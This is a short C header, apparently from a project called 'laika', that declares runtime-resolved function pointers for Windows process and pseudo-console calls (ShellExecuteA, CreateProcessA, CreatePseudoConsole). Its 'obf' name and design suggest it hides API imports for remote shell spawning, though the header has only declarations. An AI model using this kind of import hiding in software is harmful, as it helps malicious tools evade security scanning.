#ifndef LAIKA_OBF_H
#define LAIKA_OBF_H

#include "laika.h"

#ifdef _WIN32
#    include <process.h>
#    include <windows.h>

/* WINAPI types */
typedef HINSTANCE(WINAPI *_ShellExecuteA)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
typedef HRESULT(WINAPI *_CreatePseudoConsole)(COORD, HANDLE, HANDLE, HPCON *);
typedef void(WINAPI *_ClosePseudoConsole)(HPCON);
typedef BOOL(WINAPI *_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

extern _ShellExecuteA oShellExecuteA;
extern _CreatePseudoConsole oCreatePseudoConsole;
extern _ClosePseudoConsole oClosePseudoConsole;
extern _CreateProcessA oCreateProcessA;
#endif

void laikaO_init();

#endif